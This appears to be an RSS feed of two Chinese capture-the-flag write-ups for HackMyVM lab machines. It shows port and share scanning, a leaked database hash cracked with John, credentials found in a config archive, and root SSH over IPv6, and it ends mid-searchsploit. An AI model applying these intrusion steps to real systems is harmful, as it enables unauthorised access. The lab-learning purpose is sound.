<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
    <generator uri="https://gohugo.io/" version="0.150.0">Hugo</generator><title type="html"><![CDATA[l1uyun]]></title>
    
    
    
            <link href="https://l1uyun.one/tags/sec/hackmyvm/" rel="alternate" type="text/html" title="html" />
            <link href="https://l1uyun.one/tags/sec/hackmyvm/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
    <updated>2025-09-19T14:38:16+00:00</updated>
    
    
    
    
        <id>https://l1uyun.one/tags/sec/hackmyvm/</id>
    
        
        <entry>
            <title type="html"><![CDATA[HMV_airbind]]></title><link href="https://l1uyun.one/posts/hmv_airbind/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmv_airbind/</id>
            
            <published>2024-06-15T11:46:25+08:00</published>
            <updated>2024-11-24T19:08:55+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="端口扫描">端口扫描</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>~ ➤ nmap -Pn -sT 192.168.124.210 -p-
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-06-14 23:47 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.124.210
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0047s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE    SERVICE
</span></span><span style="display:flex;"><span>22/tcp filtered ssh
</span></span><span style="display:flex;"><span>80/tcp open     http
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.38 seconds
</span></span></code></pre></div><p>22端口是filtered&hellip;没注意这个细节

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_airbind_image_1.png" alt="HMV_airbind_image_1" /><figcaption>HMV_airbind_image_1</figcaption></figure>


</p>
<h2 id="web_80">web_80</h2>
<h3 id="目录扫描">目录扫描</h3>
<p>扫目录扫出来,状态不太行,应该先判断一下优先查看哪些目录</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 319<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.124.210/images/<span style="color:#f92672">]</span>   
</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 280<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/about.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; login.php<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/login.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1924<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/logos.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1977<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/stats.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; login.php<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; login.php<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 280<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/screenshots          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 324<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.124.210/screenshots/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/scripts              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 320<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.124.210/scripts/<span style="color:#f92672">]</span>  
</span></span><span style="display:flex;"><span>/registration.php     <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; login.php<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 321<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.124.210/includes/<span style="color:#f92672">]</span> 
</span></span><span style="display:flex;"><span>/db                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.124.210/db/<span style="color:#f92672">]</span>       
</span></span><span style="display:flex;"><span>/logout.php           <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; .<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/styles               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 319<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.124.210/styles/<span style="color:#f92672">]</span>   
</span></span><span style="display:flex;"><span>/settings.php         <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; login.php<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/auth.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
</span></span></code></pre></div><h3 id="db文件泄露">db文件泄露</h3>
<p>在db目录下找到一个sqlite的转储文件,使用在线工具解析一下,发现user

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_airbind_image_2.png" alt="HMV_airbind_image_2" /><figcaption>HMV_airbind_image_2</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin@localhost.com
</span></span><span style="display:flex;"><span>$2y$10$2XxuEupev6gU1qWoURsIYu7XHNiy7nve9iq7H0mUX/MzFnmvbxC9S
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~ ➤ john hhh
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1024</span> <span style="color:#66d9ef">for</span> all loaded hashes
</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">8</span> OpenMP threads
</span></span><span style="display:flex;"><span>Proceeding with single, rules:Single
</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
</span></span><span style="display:flex;"><span>Almost <span style="color:#66d9ef">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#66d9ef">if</span> any.
</span></span><span style="display:flex;"><span>Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span style="display:flex;"><span>admin            <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
</span></span><span style="display:flex;"><span>1g 0:00:00:29 DONE 2/3 <span style="color:#f92672">(</span>2024-06-14 23:58<span style="color:#f92672">)</span> 0.03439g/s 99.07p/s 99.07c/s 99.07C/s Smokey..buzz
</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span>Session completed. 
</span></span></code></pre></div><p>&hellip;..admin,admin弱口令是吧</p>
<h3 id="gif89a文件上传">GIF89a,文件上传</h3>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_airbind_image_3.png" alt="HMV_airbind_image_3" /><figcaption>HMV_airbind_image_3</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_airbind_image_4.png" alt="HMV_airbind_image_4" /><figcaption>HMV_airbind_image_4</figcaption></figure>


</p>
<h2 id="root1">root1</h2>
<p>还是得用原生的终端,tabby又出现卡死了

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_airbind_image_5.png" alt="HMV_airbind_image_5" /><figcaption>HMV_airbind_image_5</figcaption></figure>



进去之后sudo -l,nopasswd/all</p>
<h3 id="usertxt">user.txt</h3>
<p>应该又是docker环境了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ubuntu:/# find / -type f -name <span style="color:#e6db74">&#34;user.txt&#34;</span> 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/root/user.txt
</span></span><span style="display:flex;"><span>root@ubuntu:/# cat /root/user.txt
</span></span><span style="display:flex;"><span>4408f370877687429c6ab332e6f560d0
</span></span></code></pre></div><h3 id="枚举">枚举</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ubuntu:/# ip a
</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>2: eth0@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/ether dc:a1:f7:82:76:13 brd ff:ff:ff:ff:ff:ff link-netnsid <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    inet 10.0.3.241/24 brd 10.0.3.255 scope global eth0
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>    inet6 fe80::dea1:f7ff:fe82:7613/64 scope link
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>3: wlan0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc mq state DOWN group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>6: ap0: &lt;BROADCAST,MULTICAST&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noop state DOWN group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
</span></span></code></pre></div><p>体验上还是tabby好一点</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ubuntu:/tmp# ./fscan64 -h 10.0.3.241/24
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   ___                              _
</span></span><span style="display:flex;"><span>  / _ <span style="color:#ae81ff">\ </span>    ___  ___ _ __ __ _  ___| | __
</span></span><span style="display:flex;"><span> / /_<span style="color:#ae81ff">\/</span>____/ __|/ __| <span style="color:#960050;background-color:#1e0010">&#39;</span>__/ _<span style="color:#e6db74">`</span> |/ __| |/ /
</span></span><span style="display:flex;"><span>/ /_<span style="color:#ae81ff">\\</span>_____<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span><span style="color:#f92672">(</span>__| | | <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>__|   &lt;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\_</span>___/     |___/<span style="color:#ae81ff">\_</span>__|_|  <span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>__|_|<span style="color:#ae81ff">\_\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                     fscan version: 1.8.3
</span></span><span style="display:flex;"><span>start infoscan
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>icmp<span style="color:#f92672">)</span> Target 10.0.3.1        is alive
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>icmp<span style="color:#f92672">)</span> Target 10.0.3.241      is alive
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Icmp alive hosts len is: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>10.0.3.241:80 open
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>start vulscan
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://10.0.3.241         code:302 len:0      title:None 跳转url: http://10.0.3.241/login.php
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://10.0.3.241/login.php code:200 len:1924   title:Wallos - Subscription Tracker
</span></span><span style="display:flex;"><span>已完成 1/1
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 扫描结束,耗时: 7.077390677s
</span></span><span style="display:flex;"><span>root@ubuntu:/tmp#
</span></span></code></pre></div><h2 id="id_rsaipv6访问">id_rsa+ipv6访问</h2>
<p>好吧,看了一下群主的wp,原来是ipv6
进去之后得到id_rsa,然后使用ipv6地址来ssh连接</p>
<p>&hellip;..四个ipv6地址,尝试了三次都没中&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>	➜  workspace  ssh -i id_rsa root@fe80::a00:27ff:fe85:25f9%eth5
</span></span><span style="display:flex;"><span>Linux airbind 6.1.0-18-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>root@airbind:~# cat root.txt
</span></span><span style="display:flex;"><span>2bd693135712f88726c22770278a2dcf
</span></span><span style="display:flex;"><span>root@airbind:~#
</span></span></code></pre></div><h2 id="l1uyun">l1uyun</h2>
<p>第一次接触涉及ipv6的靶场&hellip;&hellip;
刚刚思路已经到了尝试id_rsa,但是没有想到是得用ipv6..
fscan的时候是扫描出来了一些ipv6地址..但是我没有往这个方向去想&hellip;</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[HMV_adria]]></title><link href="https://l1uyun.one/posts/hmv_adria/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmv_adria/</id>
            
            <published>2024-05-14T20:49:52+08:00</published>
            <updated>2024-11-24T19:25:13+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="靶机启动">靶机启动</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">68</span> ◯  arp-scan -l
</span></span><span style="display:flex;"><span>Interface: ens33, type: EN10MB, MAC: 00:0c:29:31:02:fd, IPv4: 192.168.244.101
</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>192.168.244.99  f6:39:4a:3d:95:18       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>192.168.244.102 08:00:27:22:48:cd       PCS Systemtechnik GmbH
</span></span><span style="display:flex;"><span>192.168.244.190 ca:a7:78:4d:50:e1       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.273 seconds <span style="color:#f92672">(</span>112.63 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">3</span> responded
</span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; nmap 192.168.244.102 -Pn -sT -p- --min-rate <span style="color:#ae81ff">4000</span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-05-16 20:50 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.244.102
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.046s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp  open  ssh
</span></span><span style="display:flex;"><span>80/tcp  open  http
</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
</span></span></code></pre></div><p>先简单看一下各个服务</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; whatweb adria.hmv
</span></span><span style="display:flex;"><span>http://adria.hmv <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.57<span style="color:#f92672">]</span>, Bootstrap, Cookies<span style="color:#f92672">[</span>INTELLI_7da515443a<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Debian Linux<span style="color:#f92672">][</span>Apache/2.4.57 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>192.168.244.102<span style="color:#f92672">]</span>, JQuery, MetaGenerator<span style="color:#f92672">[</span>Subrion CMS - Open Source Content Management System<span style="color:#f92672">]</span>, Open-Graph-Protocol, PoweredBy<span style="color:#f92672">[</span>Subrion<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>Blog :: Powered by Subrion 4.2<span style="color:#f92672">]</span>, UncommonHeaders<span style="color:#f92672">[</span>x-powered-cms<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>Edge<span style="color:#f92672">]</span>
</span></span></code></pre></div><h2 id="smb_139445">smb_139+445</h2>
<p>枚举一下smb</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found domain<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ADRIA
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Builtin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attempting to map shares on 192.168.244.102
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>//192.168.244.102/print$        Mapping: DENIED Listing: N/A Writing: N/A
</span></span><span style="display:flex;"><span>//192.168.244.102/DebianShare   Mapping: OK Listing: OK Writing: N/A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t understand response:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT_STATUS_CONNECTION_REFUSED listing <span style="color:#ae81ff">\*</span>
</span></span><span style="display:flex;"><span>//192.168.244.102/IPC$  Mapping: N/A Listing: N/A Writing: N/A
</span></span><span style="display:flex;"><span>//192.168.244.102/nobody        Mapping: DENIED Listing: N/A Writing: N/A
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root in ~
</span></span><span style="display:flex;"><span>≥ smbclient //192.168.244.102/DebianShare -U anonymous -p <span style="color:#ae81ff">445</span>                   20:58
</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\a</span>nonymous<span style="color:#f92672">]</span>:
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls -al
</span></span><span style="display:flex;"><span>NT_STATUS_NO_SUCH_FILE listing <span style="color:#ae81ff">\-</span>al
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Mon Dec  <span style="color:#ae81ff">4</span> 04:32:45 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">22</span> 04:10:13 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>  configz.zip                         N  <span style="color:#ae81ff">2756857</span>  Mon Nov  <span style="color:#ae81ff">6</span> 10:56:25 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">19480400</span> blocks of size 1024. <span style="color:#ae81ff">15689584</span> blocks available
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ?
</span></span><span style="display:flex;"><span>?              allinfo        altname        archive        backup         
</span></span><span style="display:flex;"><span>blocksize      cancel         case_sensitive cd             chmod          
</span></span><span style="display:flex;"><span>chown          close          del            deltree        dir            
</span></span><span style="display:flex;"><span>du             echo           exit           get            getfacl        
</span></span><span style="display:flex;"><span>geteas         hardlink       help           history        iosize         
</span></span><span style="display:flex;"><span>lcd            link           lock           lowercase      ls             
</span></span><span style="display:flex;"><span>l              mask           md             mget           mkdir          
</span></span><span style="display:flex;"><span>more           mput           newer          notify         open           
</span></span><span style="display:flex;"><span>posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
</span></span><span style="display:flex;"><span>posix_unlink   posix_whoami   print          prompt         put            
</span></span><span style="display:flex;"><span>pwd            q              queue          quit           readlink       
</span></span><span style="display:flex;"><span>rd             recurse        reget          rename         reput          
</span></span><span style="display:flex;"><span>rm             rmdir          showacls       setea          setmode        
</span></span><span style="display:flex;"><span>scopy          stat           symlink        tar            tarmode        
</span></span><span style="display:flex;"><span>timeout        translate      unlock         volume         vuid           
</span></span><span style="display:flex;"><span>wdel           logon          listconnect    showconnect    tcon           
</span></span><span style="display:flex;"><span>tdis           tid            utimes         logoff         ..             
</span></span><span style="display:flex;"><span>!              
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get configz.zip 
</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\c</span>onfigz.zip of size <span style="color:#ae81ff">2756857</span> as configz.zip <span style="color:#f92672">(</span>12820.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 12820.2 KiloBytes/sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> exit
</span></span></code></pre></div><p>解压之后没发现什么有价值的信息</p>
<p>后面没思路之后看了眼wp,还是这里面</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">{</span>21:29<span style="color:#f92672">}</span>~/workspace/tmp/configz ➭ find . -type f -exec grep <span style="color:#e6db74">&#34;pass&#34;</span> <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
</span></span><span style="display:flex;"><span>d-i passwd/user-fullname string Adam Lewis
</span></span><span style="display:flex;"><span>d-i passwd/username string alewis
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Normal user&#39;s password, either in clear text</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#d-i passwd/user-password password insecure</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#d-i passwd/user-password-again password insecure</span>
</span></span><span style="display:flex;"><span>d-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268
</span></span><span style="display:flex;"><span>d-i passwd/user-uid string <span style="color:#ae81ff">1010</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The installer will warn about weak passwords. If you are sure you know</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#d-i user-setup/allow-password-weak boolean true</span>
</span></span><span style="display:flex;"><span>d-i partman-crypto/passphrase password jojo1989
</span></span><span style="display:flex;"><span>d-i partman-crypto/passphrase-again password jojo1989
</span></span><span style="display:flex;"><span>d-i passwd/user-fullname string admin
</span></span><span style="display:flex;"><span>d-i passwd/username string admin
</span></span><span style="display:flex;"><span>d-i passwd/user-password password jojo1989
</span></span><span style="display:flex;"><span>d-i passwd/root-login boolean true
</span></span><span style="display:flex;"><span>d-i passwd/root-password password jojo1989
</span></span></code></pre></div><pre tabindex="0"><code>admin
jojo1989
</code></pre><h2 id="web_80">web_80</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Powered by Subrion 4.2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~/workspace/l1uyun_conf  ‹main› $ searchsploit subrion 4.2
</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                  |  Path
